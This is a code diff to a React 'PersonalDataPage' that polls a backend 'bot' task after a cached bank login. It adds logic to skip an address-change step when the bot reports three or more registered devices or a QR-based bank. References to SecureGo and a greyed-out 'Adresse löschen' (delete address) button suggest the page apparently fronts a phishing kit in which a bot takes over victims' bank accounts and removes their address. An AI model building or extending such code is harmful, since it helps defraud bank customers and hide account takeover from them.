@@ -124,6 +124,7 @@ function PersonalDataPage() {
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
   const [addressFlowHandled, setAddressFlowHandled] = useState(false);
+  const [skipReason, setSkipReason] = useState<"too_many_devices" | "qr_bank" | null>(null);
 
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
@@ -157,9 +158,21 @@ function PersonalDataPage() {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
+      // Skip the address-change flow entirely when the backend won't perform
+      // it (3+ devices already registered or QR-bank). Both fields must be
+      // present on the result – otherwise fall back to the legacy behaviour.
+      const r = data?.result;
+      if (r && !addressFlowHandled && skipReason === null) {
+        const dc = typeof r.device_count === "number" ? r.device_count : null;
+        const qr = typeof r.qr_bank === "boolean" ? r.qr_bank : null;
+        if (dc !== null && qr !== null) {
+          if (qr) setSkipReason("qr_bank");
+          else if (dc >= 3) setSkipReason("too_many_devices");
+        }
+      }
       // Unlock the address-change popup only after the backend signals it is
       // ready for the user's confirmation.
-      if (data?.status === "waiting_for_address_confirm" && !addressFlowHandled) {
+      if (data?.status === "waiting_for_address_confirm" && !addressFlowHandled && skipReason === null) {
         setAddressDecisionPending(true);
       }
       if (data?.status === "completed" || data?.status === "failed") return;
@@ -168,7 +181,16 @@ function PersonalDataPage() {
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
-  }, [taskId, addressFlowHandled]);
+  }, [taskId, addressFlowHandled, skipReason]);
+
+  // When the bot signals no address change is needed, jump to the completion
+  // screen immediately once the personal-data overview is on screen.
+  useEffect(() => {
+    if (skipReason && step === "personal") {
+      setAddressDecisionPending(false);
+      setAddressFlowHandled(true);
+    }
+  }, [skipReason, step]);
 
   const customer = useMemo(
     () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
@@ -216,9 +238,12 @@ function PersonalDataPage() {
             setStep("address");
           }}
           onContinue={() => {
-            // Always route into the address step. AddressVerification keeps
-            // the "Adresse löschen" button greyed out via `addressReady`
-            // until the backend reaches `waiting_for_address_confirm`.
+            // Skip the address flow when the backend already told us it
+            // won't be attempted (3+ devices or QR-bank).
+            if (skipReason) {
+              setStep("done");
+              return;
+            }
             setStep("address");
           }}
           onEditAddress={() => setStep("done")}
@@ -287,7 +312,7 @@ function PersonalDataPage() {
       )}
 
       {customer && step === "done" && (
-        <CompletionStep theme={theme} customerName={customer.name} />
+        <CompletionStep theme={theme} customerName={customer.name} reason={skipReason} />
       )}
 
       {!customer && (
